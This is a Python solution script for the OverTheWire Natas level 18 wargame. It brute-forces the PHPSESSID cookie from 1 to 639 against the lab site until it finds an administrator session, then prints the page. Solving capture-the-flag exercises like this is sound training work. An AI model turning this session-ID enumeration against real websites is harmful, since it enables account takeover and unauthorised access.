#!/usr/bin/env python3

import getpass
import requests

###############################################################################
# Configuration
###############################################################################

# The URL of the level as well as the username for it. There will be a known
# password as well, but read it from the user so that it is not published.
LEVEL_CURRENT = 'natas18'
LEVEL_NEXT = 'natas19'
URL = f'http://{LEVEL_CURRENT}.natas.labs.overthewire.org/index.php'

# The string used to determine if the session id is incorrect.
FAILURE_STRING = 'You are logged in as a regular user'

def get_authentication_credentials() -> tuple[str, str]:
    """Prompt the user for the password and return the authentication tuple."""
    password = getpass.getpass(prompt=f'Enter password for {LEVEL_CURRENT}: ')
    return LEVEL_CURRENT, password

def send_request(credentials: tuple[str, str], cookies: dict[str, str]) -> str:
    """
    Sends a request with the given authentication and cookies.
    Returns the response text or raises an exception on failure.
    """
    response = requests.get(URL, auth=credentials, cookies=cookies)
    response.raise_for_status()

    return response

def response_indicates_success(response: str) -> bool:
    if response.status_code != 200:
        raise RuntimeError(f"Unexpected response:\n{response.text}")
    else:
        return FAILURE_STRING not in response.text

def main():
    credentials = get_authentication_credentials()

    for id in range(1, 640):
        print(f'Trying PHPSESSID={ id }')
        response = send_request(credentials, { "PHPSESSID": str(id) })

        if response_indicates_success(response):
            print(response.text)
            break

if __name__ == '__main__':
    main()
